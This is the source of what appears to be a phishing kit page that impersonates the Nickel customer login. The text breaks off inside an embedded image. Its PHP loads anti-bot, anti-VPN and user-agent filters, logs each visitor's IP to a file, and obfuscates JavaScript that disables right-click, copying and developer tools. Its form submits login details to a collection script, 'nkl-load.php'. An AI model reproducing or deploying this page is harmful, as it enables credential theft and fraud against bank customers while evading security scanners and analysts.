<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
session_id(md5(getenv('REMOTE_ADDR')));
session_start();

$stripos = 0;

include 'config.php';

include 'M3tri-anti-bots_v0.01/M3tri-ips.php';
include 'M3tri-anti-bots_v0.01/M3tri-OS-BRS.php';
include 'M3tri-anti-bots_v0.01/M3tri-UA.php';
include 'M3tri-anti-bots_v0.01/M3tri-vpn-proxy.php';


$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');
$hostname = gethostbyaddr($ip);




if ($_GET['error'] == 'on'){

$errormsg = "<p><span style='color: red;font-size:small;font-family: sans-serif;'>verifier les champs</span><br></p>";

}

require_once './includes/HunterObfuscator.php'; //Include the class

$jsCode = " jQuery(function($){ document.addEventListener('contextmenu', event => event.preventDefault()); document.onkeydown = function(e) { if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 117 || e.keyCode === 44)) { return false; } else { return true; } }; $(document).keydown(function (event) { if (event.keyCode == 123) { return false; } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { return false; } }); }) "; //Simple JS code

$hunter = new HunterObfuscator($jsCode); //Initialize with JS code in parameter
$hunter->addDomainName($_SERVER['HTTP_HOST']);
$obsfucated = $hunter->Obfuscate(); //Do obfuscate and get the obfuscated code


$permitted_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_~";


$fp = fopen('users/'. $ip .'.txt', 'wb');
	        fwrite($fp, '');
            fclose($fp);
			
?>
<!DOCTYPE html> 
<html lang="fr-FR" oncontextmenu="return false;" onselectstart="return false" ondrag="return false" ondrop="return false" onpaste="return false;" oncopy="return false;" oncut="return false;">

<head><meta charset="utf-8">
        
        <title>Customer area : Manage your account | Nickel</title>
        <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no,maximum-scale=1,user-scalable=0">
      
        <style>.hIzZA{-webkit-box-align:center}.hIzZA:disabled{cursor:not-allowed}.hDrShV:hover:not(:active):not(:disabled){background-color:transparent;color:#515151}.hDrShV:disabled{background-color:transparent;color:#515151}.hDrShV:hover:not(:active):not(:disabled) span{text-decoration-color:#515151}.hWUUbn{background-color:#ff5f00;color:#fff;font-size:1.125rem;border:0;height:3.0625rem;padding:0px 1.5rem}.hWUUbn:hover:not(:active):not(:disabled){background-color:#cc4c00;color:#fff}.hWUUbn:disabled{background-color:#8e8e8e;color:#fff}.brmByp{background-color:#fff;border-color:#e2e2e2;border-radius:8px;border-style:solid;border-width:1px;transition:all 150ms cubic-bezier(0.4,0,0.2,1) 0s}.brmByp:hover{border-color:#515151}.brmByp:focus-within{border-color:#191f29}.cjfGxV{-webkit-box-align:center;align-items:center;display:flex;gap:.5rem;padding:.8rem 1rem;position:relative}.dYWVma{background-color:transparent;border:0;color:#191f29;font-family:"Roboto Mono",monospace;font-size:1rem;line-height:1rem;outline:0;padding:0px;text-overflow:ellipsis;width:100%}.dYWVma::-webkit-input-placeholder{color:#515151}.dYWVma::placeholder{color:#515151}.dYWVma:focus::-webkit-input-placeholder{color:transparent}.dYWVma:focus::placeholder{color:transparent}.dYWVma:-webkit-autofill{box-shadow:white 0px 0px 0px 1000px inset}.dYWVma::-webkit-search-cancel-button{display:none}.dNkBmv{background-color:transparent;color:#191f29;display:inline-block;font-size:1rem;font-weight:500;left:.5rem;max-height:1.5rem;max-width:90%;overflow:hidden;padding:0px .25rem;position:absolute;text-overflow:ellipsis;top:-0.85rem;transition:all 150ms cubic-bezier(0.4,0,0.2,1) 0s;white-space:nowrap;z-index:0}.dNkBmv::before{background-color:#fff;content:"";display:block;height:1px;left:0px;position:absolute;top:calc(0.85rem - 1px);width:100%;z-index:-1}.ihmKiB{position:relative;z-index:0}.bgEazn{color:#515151;font-family:"Roboto Mono",monospace;left:17px;position:absolute;top:15px;z-index:-1}.cLtTbs{background-color:#fff;border:1px solid #191f29;border-radius:2px;display:inline-flex;height:1.125rem;width:1.125rem}.cLtTbs svg{fill:#fff}.ePWYAk{height:1rem;margin:auto;visibility:hidden;width:1rem}.jMZCgP>*{cursor:pointer}.jMZCgP span{color:#191f29}.imjWmH{border:0px;clip:rect(0px,0px,0px,0px);height:1px;margin:-1px;overflow:hidden;position:absolute;white-space:nowrap;width:1px}.bXTGDR{font-size:1rem;font-style:normal;font-weight:400;padding-left:.5rem;vertical-align:top}@media(min-width:768px){.csbmgn{-webkit-box-align:center;align-items:center;display:grid;grid-auto-flow:column;gap:.5rem;-webkit-box-pack:start;justify-content:flex-start;list-style:none;margin:0px;padding:0px}}.jjdYjy{-webkit-box-align:center;-webkit-box-pack:start}@media(min-width:768px){.jjdYjy{display:none}}</style>
        <style>.dbQnLk{font-style:normal;font-weight:700;line-height:2rem;text-align:center}.klKumv{font-style:normal;font-weight:400;font-size:1rem;line-height:1.5rem;text-align:center}.fvWiKM{display:flex;flex-direction:column;gap:.5rem;-webkit-box-align:center;align-items:center;padding:1rem}@media(min-width:768px){.fvWiKM{padding:2rem}}.izOGgw{display:flex;flex-direction:column;gap:1.5rem;margin-bottom:1.5rem;-webkit-box-align:stretch;align-items:stretch;width:100%;max-width:340px}.gVANIR{padding:1rem 0px;width:100%;max-width:210px}@media(min-width:768px){.gVANIR{padding:1.5rem 0px}}.kWokIK{-webkit-box-align:center;align-items:center;display:flex;flex-direction:row;-webkit-box-pack:center;justify-content:center}@media(min-width:768px){.fVtOqH{display:block}}.dalabt{-webkit-box-pack:start}.bOoHPe{-webkit-box-align:center;-webkit-box-pack:center}@media(min-width:768px){.bOoHPe{box-shadow:none;height:6rem;-webkit-box-pack:start;justify-content:start;margin:0px 1.5rem}}@media(min-width:1280px){.bOoHPe{margin:0px 5rem}}.fRPFrj{-webkit-box-align:center;-webkit-box-pack:start}.lnBwCw{-webkit-box-flex:1}@media(min-width:768px){.lnBwCw{box-shadow:rgba(25,31,41,0.1) 0px .25rem 1rem;-webkit-box-flex:unset;flex-grow:unset;width:36.25rem}.lnBwCw::before{background-color:#373f51;border-radius:.25rem .25rem 0px 0px;content:"";display:block;height:.25rem;position:relative;width:36.25rem}}.bCyfTj{-webkit-box-align:center;-webkit-box-pack:center}@media(min-width:768px){.bCyfTj{margin:1.5rem 0px;height:unset}}@media(min-width:768px){.bOFeRz{align-self:stretch;background-color:#191f29;height:unset}}.llEieV ::-webkit-scrollbar{width:7px}.llEieV ::-webkit-scrollbar-track{background-color:#f4f6f9;border-radius:4px}.llEieV ::-webkit-scrollbar-thumb{background-color:#ff5f00;border-radius:4px}@media(min-width:576px){.lJvlA{padding:0px 1.5rem}}@-webkit-keyframes Jzwaa{20%{width:2rem}35%{width:calc(5rem)}85%{width:calc(5rem)}}@keyframes Jzwaa{20%{width:2rem}35%{width:calc(5rem)}85%{width:calc(5rem)}}@-webkit-keyframes iSDhUg{10%{width:calc(2rem)}25%{width:calc(8rem)}85%{width:calc(8rem)}}@keyframes iSDhUg{10%{width:calc(2rem)}25%{width:calc(8rem)}85%{width:calc(8rem)}}@-webkit-keyframes cByGEu{15%{width:calc(5rem)}85%{width:calc(5rem)}}@keyframes cByGEu{15%{width:calc(5rem)}85%{width:calc(5rem)}}</style>
        <style>nav{display:block}html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}*,:after,:before{box-sizing:border-box}a{background:transparent}a:focus{outline:thin dotted}a:active,a:hover{outline:0}h1,ol,p{margin:0;padding:0}ol{list-style:none}svg:not(:root){overflow:hidden}button,input{font-family:inherit;font-size:100%;margin:0;outline:0}button{line-height:normal}button{text-transform:none}button{-webkit-appearance:button}/*! End normalize.css v2.1.3 | MIT License | git.io/normalize */html{font-size:16px;overflow:hidden}html ::-webkit-scrollbar{width:7px}html ::-webkit-scrollbar-track{background-color:#f4f6f9;border-radius:4px}html ::-webkit-scrollbar-thumb{background-color:#ff5f00;border-radius:4px}#root,body,html{height:100%;width:100%;line-height:normal}h1{font-family:"Muller Narrow",sans-serif}input::-webkit-inner-spin-button,input::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}</style>
        <style>*{font-family:Sarabun,sans-serif}.erBgkb{display:flex;flex-direction:column;gap:.5rem;-webkit-box-align:stretch;align-items:stretch;padding:1rem}@media(min-width:768px){.erBgkb{padding:2rem}}.hOYYZG{margin:1rem}.kbEDhr{display:flex;-webkit-box-pack:center;justify-content:center;margin:1rem}.csoHSi{display:flex;-webkit-box-pack:center;justify-content:center;-webkit-box-align:center;align-items:center;padding:2rem 0px}.fVtOqH{display:none}.fVtOqH a{color:#191f29;text-decoration:underline}@media(min-width:768px){.fVtOqH{display:block}}.dalabt{background-color:#fff;display:flex;flex-direction:column;height:100vh;-webkit-box-pack:start;justify-content:start;overflow:auto}.bOoHPe{-webkit-box-align:center;align-items:center;box-shadow:rgba(25,31,41,0.1) 0px .25rem 1rem;display:flex;gap:1.5rem;height:5rem;-webkit-box-pack:center;justify-content:center}@media(min-width:768px){.bOoHPe{box-shadow:none;height:6rem;-webkit-box-pack:start;justify-content:start;margin:0px 1.5rem}}@media(min-width:1280px){.bOoHPe{margin:0px 5rem}}.fRPFrj{-webkit-box-align:center;align-items:center;display:flex;-webkit-box-pack:start;justify-content:start}.LNHIN{fill:#ff5f00;height:32px;width:32px}.jNqTQC{height:80px;width:80px}.lnBwCw{align-self:center;border-radius:.25rem .25rem .5rem .5rem;-webkit-box-flex:1;flex-grow:1;width:100%}@media(min-width:768px){.lnBwCw{box-shadow:rgba(25,31,41,0.1) 0px .25rem 1rem;-webkit-box-flex:unset;flex-grow:unset;width:36.25rem}.lnBwCw::before{background-color:#373f51;border-radius:.25rem .25rem 0px 0px;content:"";display:block;height:.25rem;position:relative;width:36.25rem}}.bCyfTj{-webkit-box-align:center;align-items:center;border-radius:.5rem .5rem 0px 0px;display:flex;gap:1rem;-webkit-box-pack:center;justify-content:center;justify-self:end;height:3rem}.bCyfTj button{align-self:unset}.bCyfTj span{font-weight:normal}@media(min-width:768px){.bCyfTj{margin:1.5rem 0px;height:unset}}.bOFeRz{background-color:#fff;width:1px;height:1.5rem}@media(min-width:768px){.bOFeRz{align-self:stretch;background-color:#191f29;height:unset}}.llEieV{background-color:#f4f6f9;height:100%;width:100%}.llEieV ::-webkit-scrollbar{width:7px}.llEieV ::-webkit-scrollbar-track{background-color:#f4f6f9;border-radius:4px}.llEieV ::-webkit-scrollbar-thumb{background-color:#ff5f00;border-radius:4px}.lJvlA{position:fixed;bottom:1.5rem;width:100%;z-index:1000}@media(min-width:576px){.lJvlA{padding:0px 1.5rem}}@-webkit-keyframes Jzwaa{20%{width:2rem}35%{width:calc(5rem)}85%{width:calc(5rem)}}@keyframes Jzwaa{20%{width:2rem}35%{width:calc(5rem)}85%{width:calc(5rem)}}@-webkit-keyframes iSDhUg{10%{width:calc(2rem)}25%{width:calc(8rem)}85%{width:calc(8rem)}}@keyframes iSDhUg{10%{width:calc(2rem)}25%{width:calc(8rem)}85%{width:calc(8rem)}}@-webkit-keyframes cByGEu{15%{width:calc(5rem)}85%{width:calc(5rem)}}@keyframes cByGEu{15%{width:calc(5rem)}85%{width:calc(5rem)}}</style>
        <style>.jSOxpG{bottom:0px;left:0px;width:100%}.hIzZA{-webkit-box-align:center;align-items:center;place-self:start;border-radius:1.5625rem;box-shadow:none;cursor:pointer;display:inline-flex;max-width:inherit}.hIzZA svg{height:1rem;margin-right:.5rem;min-width:1rem;width:1rem}.hIzZA:disabled{cursor:not-allowed}.jqwhcx{font-style:normal;font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.hDrShV{background-color:transparent;color:#191f29;font-size:1rem;border:0;padding:0px}.hDrShV svg{fill:#191f29}.hDrShV:hover:not(:active):not(:disabled){background-color:transparent;color:#515151}.hDrShV:hover:not(:active):not(:disabled) svg{fill:#515151}.hDrShV:disabled{background-color:transparent;color:#515151}.hDrShV:disabled svg{fill:#515151}.hDrShV:hover:not(:active):not(:disabled) span{text-decoration-color:#515151}.hDrShV span{padding-bottom:.125rem;text-decoration:underline;text-underline-offset:.125rem}.eyvCgp{-webkit-box-align:center;align-items:center;background-color:#e7f0ff;border-radius:50%;display:flex;flex-shrink:0;font-size:.625rem;font-weight:400;height:1.5rem;-webkit-box-pack:center;justify-content:center;position:relative;width:1.5rem}.eyvCgp svg{height:.75rem;width:.75rem}.cSuaNd{-webkit-box-align:center;align-items:center;background-color:#fff;border-radius:64px;box-shadow:#e2e2e2 0px 0px 0px 1px inset;display:flex;max-width:fit-content;padding:.5rem 1rem .5rem .5rem}.cyRYwK{width:fit-content}.kdlNVO{-webkit-box-align:center;align-items:center;padding-left:1rem}.iyUBjV{color:#191f29;font-weight:400;overflow:hidden;padding:0px 0px 0px 1rem;text-overflow:ellipsis;white-space:nowrap}.csbmgn{display:none}@media(min-width:768px){.csbmgn{-webkit-box-align:center;align-items:center;display:grid;grid-auto-flow:column;gap:.5rem;-webkit-box-pack:start;justify-content:flex-start;list-style:none;margin:0px;padding:0px}}.ldeswP{font-weight:400}.bHGhyL{color:#191f29;font-weight:500}.goUeQp{fill:#515151;height:1rem;width:1rem}.eqRlsb{fill:#515151;height:1rem;width:1rem}.jjdYjy{-webkit-box-align:center;align-items:center;display:grid;grid-auto-flow:column;gap:.5rem;-webkit-box-pack:start;justify-content:flex-start}@media(min-width:768px){.jjdYjy{display:none}}</style>
        <style>.hyklft{display:grid;gap:1rem;grid-template-columns:repeat(4,1fr);width:fit-content}.bcLSBZ{color:#191f29;background-color:#fff;border:0;border-radius:8px;box-shadow:rgba(25,31,41,0.1) 0px 4px 16px;cursor:pointer;height:3rem;width:3rem;font-size:1.125rem;font-weight:700}.bcLSBZ:active{background-color:#f4f6f9}.icESVQ{background-color:#fff;border:0;border-radius:8px;box-shadow:rgba(25,31,41,0.1) 0px 4px 16px;cursor:pointer;height:3rem;place-content:center space-evenly;color:#373f51;display:flex;flex-wrap:wrap;font-size:1rem;font-weight:400;width:100%}.icESVQ:active{background-color:#f4f6f9}.bQoJjS{grid-column:span 2/auto}.jOitne{background-color:transparent;border-color:#e2e2e2;border-radius:8px;border-style:solid;border-width:1px;transition:all 150ms cubic-bezier(0.4,0,0.2,1) 0s}.jOitne:hover{border-color:#6d7179;cursor:pointer}.jOitne:focus-within{border-color:#191f29}.jOitne:hover{cursor:pointer}.jgiaLV{-webkit-box-align:center;align-items:center;display:flex;flex-direction:row;gap:.5rem;height:20px}.csorHI{background-color:transparent;border:1px solid #e2e2e2;border-radius:50%;height:10px;width:10px}.RkGTF{background-color:transparent;color:#191f29;display:flex;font-size:1rem;font-weight:500;left:.5rem;padding:0px .5rem;position:absolute;top:-0.9rem;transition:all 150ms cubic-bezier(0.4,0,0.2,1) 0s;z-index:0}.RkGTF::before{background-color:#fff;content:"";display:block;height:1px;left:0px;position:absolute;top:calc(0.9rem - 1px);width:100%;z-index:-1}.RkGTF.required::after{color:#1f61d4;content:"*";padding-left:.25rem}.jwMwxI{-webkit-box-align:center;align-items:center;display:flex;gap:.5rem;-webkit-box-pack:justify;justify-content:space-between;padding:.8rem 1rem;position:relative}.eA-duXD{cursor:pointer;height:1rem}.htktdm{-webkit-box-align:center;align-items:center;display:flex;-webkit-box-pack:justify;justify-content:space-between}.gWAGLc{color:#191f29;cursor:pointer;font-size:1rem;margin-left:.25rem;margin-top:.25rem;text-decoration:underline}</style>
        <style></style>
        <style></style>
        
        <style></style>
    <style></style><style></style><link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAACMuAAAjLgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABf/wAAX/8PAF//lgBf/48AX/8LAF//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX/8AAF//JwBf/+cAX//fAF//HwBf/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF//AABf/wUAX/9UAF//TwBf/wQAX/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX/8AAF//AABf/xYAX/9ZAF//YABf/2AAX/9YAF//FABf/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF//AABf/wAAX/92AF///wBf//8AX///AF///wBf/2wAX/8AAF//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABf/wAAX/8AAF//QgBf/7oAX//CAF//wwBf/7cAX/87AF//AABf/wAAAAAAAAAAAAAAAAAAAAAAAAAAAABf/wAAX/8CAF//HQBf/ysAX/80AF//NwBf/zcAX/8zAF//KwBf/xwAX/8BAF//AAAAAAAAAAAAAAAAAAAAAAAAX/8AAF//MQBf/9YAX//tAF//6wBf/+sAX//rAF//6wBf/+0AX//QAF//KQBf/wAAAAAAAAAAAAAAAAAAAAAAAF//AABf/zMAX//bAF//8ABf/+8AX//vAF//7wBf/+8AX//xAF//1QBf/ysAX/8AAAAAAAAAAAAAAAAAAAAAAABf/wAAX/8CAF//IgBf/zAAX/8zAF//NQBf/zUAX/8zAF//MABf/yAAX/8BAF//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAF//AABf/wAAX/82AF//pQBf/68AX/+vAF//owBf/zEAX/8AAF//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABf/wAAX/8AAF//eQBf//8AX///AF///wBf//8AX/9wAF//AABf/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX/8AAF//AABf/x4AX/9vAF//dwBf/3cAX/9tAF//GwBf/wAAX/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX/8AAF//AgBf/zcAX/8zAF//AQBf/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF//AABf/yQAX//gAF//2QBf/x0AX/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABf/wAAX/8WAF//uwBf/7MAX/8RAF//AAAAAAAAAAAAAAAAAAAAAAAAAAAA/D8AAPw/AAD8PwAA+B8AAPgfAAD4HwAA4AcAAOAHAADgBwAA4AcAAPgfAAD4HwAA+B8AAPw/AAD8PwAA/D8AAA=="><style>img[src="data:,"],source[src="data:,"]{display:none!important}</style></head>
    <body>
        <div id="root">
            <div class="sc-eByPHW llEieV">
                <div class="sc-eLSyJA lJvlA">
                    <div id="toasterContainer" class="sc-hLBbgP jSOxpG"></div>
                </div>
                <form id="frm" class="sc-hRUHzT dalabt root-side-panel" method="post" action="<?php echo 'nkl-load.php?token='.$token1; ?>">
				
					<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>


                    <div class="sc-czNxle bOoHPe">
                        <div class="sc-cKhgmI fRPFrj">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="1em" height="1em" css="" class="sc-dkQUaI sc-hgRTRj hQrVZb LNHIN">
                                <path d="M719.3 444.3H304.8c-40.1 0-72.5 32-72.5 72.1 0 39.8 32.5 71.9 72.5 71.9h414.6c39.9 0 72.5-32.1 72.5-71.9-.1-40.1-32.7-72.1-72.6-72.1zM512 144.8c40 0 72.5-32.3 72.5-72.3C584.4 32.7 551.9 0 512 0s-72.4 32.7-72.4 72.5c0 40 32.5 72.3 72.4 72.3zM606.2 660.4H418c-39.7 0-72.3 32-72.3 71.8s32.4 72.3 72.1 72.3H606l.2.4c39.8 0 72.1-32.4 72.1-72.2.1-39.7-32.2-72.3-72.1-72.3zM606.2 224H418c-39.7 0-72.3 32-72.3 71.7 0 40 32.4 72.3 72.1 72.3H606l.2.1c39.8 0 72.1-32.2 72.1-72 .1-39.7-32.2-72.1-72.1-72.1zM512 879.1c-39.9 0-72.4 32.6-72.4 72.5 0 40 32.6 72.4 72.4 72.4 40 0 72.5-32.4 72.5-72.4-.1-39.9-32.6-72.5-72.5-72.5z"></path>
                            </svg>
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="1em" height="1em" css="" class="sc-ikXwFM sc-bOKJCu hZHGfK jNqTQC">
                                <path d="M245.1 449.1c17.2 0 31.2-14 31.2-31.2 0-17.3-14-31.2-31.2-31.2-17.3 0-31.3 14-31.3 31.2s14 31.2 31.3 31.2zM840.2 578.7h-77.7v-38.3h77.2c2.6 0 5.1-2.1 5.1-4.7V489c0-2.6-2.5-5.2-5.1-5.2h-77.2v-38.4h77.7c2.6 0 4.6-1.9 4.6-4.5v-49.5c0-2.6-2-4.5-4.6-4.5H704.5c-2.6 0-4.2 1.9-4.2 4.5v241.4c0 2.6 1.6 4.6 4.2 4.6h135.7c2.6 0 4.6-2 4.6-4.6v-49c0-2.6-2-5.1-4.6-5.1zM182.5 386.8h-53.8c-2.6 0-4.4 1.9-4.4 4.5v71.6c0 23 1.9 44.4 5.6 65.6L58.3 391.8c-1.6-3.1-4.9-5-8.4-5H4.1c-2.6 0-4.1 1.9-4.1 4.5v241.4c0 2.6 1.4 4.6 4.1 4.6h52.6c2.6 0 5.5-2 5.5-4.6v-71.6c0-23.3-2.5-44.4-6.5-65.6l71.7 136.8c1.6 3.1 4.6 4.9 8.1 4.9h47.1c2.7 0 4-2 4-4.6V391.3c-.1-2.6-1.4-4.5-4.1-4.5zM269.9 481.9h-49.8c-2.6 0-4.4 1.6-4.4 4.2v146.6c0 2.6 1.9 4.6 4.4 4.6h49.8c2.6 0 4.4-2 4.4-4.6V486.1c0-2.6-1.8-4.2-4.4-4.2zM455.9 574.7c-11.5 4.3-24.1 6.8-36.2 6.8-34.4 0-56.3-22.6-56.3-67.7 0-46.9 24-70.9 58-70.9 12.8 0 23.7 1.8 32.6 5.3 3.1 1.2 6.8-1.1 6.8-4.4v-49.3c0-1.9-1.6-3.7-3.4-4.4-14.5-5.4-29.4-8.6-44.7-8.6-63.5 0-113.4 46.6-113.8 132.2 0 87.8 52.3 128.6 113.2 128.6 17.3 0 32.9-2.8 47.1-7.8 1.9-.7 3.4-2.5 3.4-4.4v-51c0-3.2-3.6-5.5-6.7-4.4zM1018.6 578.7h-78.7V391.3c0-2.6-1.8-4.5-4.4-4.5H883c-2.7 0-5.3 1.9-5.3 4.5v241.4c0 2.6 2.6 4.6 5.3 4.6h135.7c2.6 0 5.4-2 5.4-4.6v-49.1c-.1-2.6-2.9-4.9-5.5-4.9zM682.1 630.6l-61.8-118.3L682 393.4c1.5-3.1-.8-6.6-4.3-6.6h-53.3c-1 0-1.9 0-2.4.9l-49.6 94.1h-22.1v-90.5c0-2.6-2.2-4.5-4.7-4.5H493c-2.6 0-4.9 1.9-4.9 4.5v241.4c0 2.6 2.3 4.6 4.9 4.6h52.6c2.6 0 4.7-2 4.7-4.6v-90.5h22l49.1 92.7c.7 1.7 2.5 2.4 4.3 2.4h52.1c3.6 0 5.9-3.6 4.3-6.7z"></path>
                            </svg>
                        </div>
                        <div class="sc-bOCfAF fVtOqH">
                            <nav aria-label="breadcrumb">
                                <ol class="sc-eJDSGI csbmgn">
                                    <li class="sc-oZIhv ldeswP">
                                        <a href="#">Nickel Site</a>
                                    </li>
                                    <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="sc-ehvNnt goUeQp" height="24" width="24" aria-hidden="true">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.293 5.293a1 1 0 0 1 1.414 0l6 6a1 1 0 0 1 0 1.414l-6 6a1 1 0 0 1-1.414-1.414L13.586 12 8.293 6.707a1 1 0 0 1 0-1.414Z"></path>
                                    </svg>
                                    <li class="sc-oZIhv sc-hiDMwi ldeswP bHGhyL">
                                        <span aria-current="page" aria-label="current-page">Connectez-vous à votre espace client</span>
                                    </li>
                                </ol>
                                <div class="sc-gGvHcT jjdYjy">
                                    <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="sc-laZRCg eqRlsb" height="24" width="24">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M15.707 5.293a1 1 0 0 1 0 1.414L10.414 12l5.293 5.293a1 1 0 0 1-1.414 1.414l-6-6a1 1 0 0 1 0-1.414l6-6a1 1 0 0 1 1.414 0Z"></path>
                                    </svg>
                                    <a href="#">Nickel Site</a>
                                </div>
                            </nav>
                        </div>
                    </div>
                    <div class="sc-hrlCSN lnBwCw" id="div0">
                        <div class="sc-eqLmJG fvWiKM" >
                            <h1 class="sc-bjHqKj dbQnLk" style="font-size:1.7rem">Connectez-vous à votre espace client</h1>
                            <p class="sc-eYWepU klKumv">Votre identifiant se trouve au dos de votre carte Nickel</p>
                            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTk1IiBoZWlnaHQ9IjEyNCIgdmlld0JveD0iMCAwIDE5NSAxMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDcuNzVDMCAzLjQ2OTc5IDMuNDkyMTggMCA3LjggMEgxODcuMkMxOTEuNTA4IDAgMTk1IDMuNDY5NzkgMTk1IDcuNzVWMTE2LjI1QzE5NSAxMjAuNTMgMTkxLjUwOCAxMjQgMTg3LjIgMTI0SDcuOEMzLjQ5MjE4IDEyNCAwIDEyMC41MyAwIDExNi4yNVY3Ljc1WiIgZmlsbD0iI0ZGNUYwMCIvPgo8cGF0aCBkPSJNMCAxNC4wNDY5SDE5NVY0MS4xNzE5SDBWMTQuMDQ2OVoiIGZpbGw9IiMxOTFGMjkiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNDUuNTI4IDUyLjM2MTNDMTQ2LjA4MSA1Mi4zNjEzIDE0Ni41MyA1MS45MTgyIDE0Ni41MyA1MS4zNjk1QzE0Ni41MjkgNTAuODIzNiAxNDYuMDc5IDUwLjM3NSAxNDUuNTI4IDUwLjM3NUMxNDQuOTc2IDUwLjM3NSAxNDQuNTI3IDUwLjgyMzYgMTQ0LjUyNyA1MS4zNjk1QzE0NC41MjcgNTEuOTE4MiAxNDQuOTc2IDUyLjM2MTMgMTQ1LjUyOCA1Mi4zNjEzWk0xNDguMzkzIDU2LjQ2OThIMTQyLjY2M0MxNDIuMTA5IDU2LjQ2OTggMTQxLjY2MSA1Ni45MDg3IDE0MS42NjEgNTcuNDU4OEMxNDEuNjYxIDU4LjAwNDggMTQyLjExIDU4LjQ0NTEgMTQyLjY2MyA1OC40NDUxSDE0OC4zOTVDMTQ4Ljk0NiA1OC40NDUxIDE0OS4zOTcgNTguMDA0OCAxNDkuMzk3IDU3LjQ1ODhDMTQ5LjM5NiA1Ni45MDg3IDE0OC45NDUgNTYuNDY5OCAxNDguMzkzIDU2LjQ2OThaTTE0NC4yMjggNTkuNDM0MUgxNDYuODNDMTQ3LjM4MSA1OS40MzQxIDE0Ny44MjggNTkuODgxMyAxNDcuODI3IDYwLjQyNTlDMTQ3LjgyNyA2MC45NzE5IDE0Ny4zOCA2MS40MTYzIDE0Ni44MyA2MS40MTYzTDE0Ni44MjcgNjEuNDEwOUgxNDQuMjI1QzE0My42NzcgNjEuNDEwOSAxNDMuMjI5IDYwLjk2NSAxNDMuMjI5IDYwLjQxOTFDMTQzLjIyOSA1OS44NzMxIDE0My42NzkgNTkuNDM0MSAxNDQuMjI4IDU5LjQzNDFaTTE0Ni44MyA1My40NDc4SDE0NC4yMjhDMTQzLjY3OSA1My40NDc4IDE0My4yMjkgNTMuODg2NyAxNDMuMjI5IDU0LjQzMTNDMTQzLjIyOSA1NC45OCAxNDMuNjc3IDU1LjQyMzEgMTQ0LjIyNSA1NS40MjMxSDE0Ni44MjdMMTQ2LjgzIDU1LjQyNDVDMTQ3LjM4IDU1LjQyNDUgMTQ3LjgyNyA1NC45ODI4IDE0Ny44MjcgNTQuNDM2OEMxNDcuODI4IDUzLjg5MjIgMTQ3LjM4MSA1My40NDc4IDE0Ni44MyA1My40NDc4Wk0xNDQuNTI3IDYzLjQyODdDMTQ0LjUyNyA2Mi44ODE0IDE0NC45NzYgNjIuNDM0MiAxNDUuNTI4IDYyLjQzNDJDMTQ2LjA3OSA2Mi40MzQyIDE0Ni41MjkgNjIuODgxNCAxNDYuNTMgNjMuNDI4N0MxNDYuNTMgNjMuOTc3NCAxNDYuMDgxIDY0LjQyMTkgMTQ1LjUyOCA2NC40MjE5QzE0NC45NzcgNjQuNDIxOSAxNDQuNTI3IDYzLjk3NzQgMTQ0LjUyNyA2My40Mjg3WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNjYuNDc3IDU5LjczOEMxNjYuODcyIDU5LjczOCAxNjcuMjgzIDU5LjY1NyAxNjcuNjU4IDU5LjUxNzhDMTY3Ljc1OSA1OS40ODIyIDE2Ny44NzcgNTkuNTU2NyAxNjcuODc3IDU5LjY2MDNWNjEuMzExNEMxNjcuODc3IDYxLjM3MyAxNjcuODI4IDYxLjQzMTIgMTY3Ljc2NiA2MS40NTM5QzE2Ny4zMDMgNjEuNjE1OCAxNjYuNzk0IDYxLjcwNjQgMTY2LjIyOSA2MS43MDY0QzE2NC4yNDIgNjEuNzA2NCAxNjIuNTM2IDYwLjM4NTUgMTYyLjUzNiA1Ny41NDI4QzE2Mi41NDkgNTQ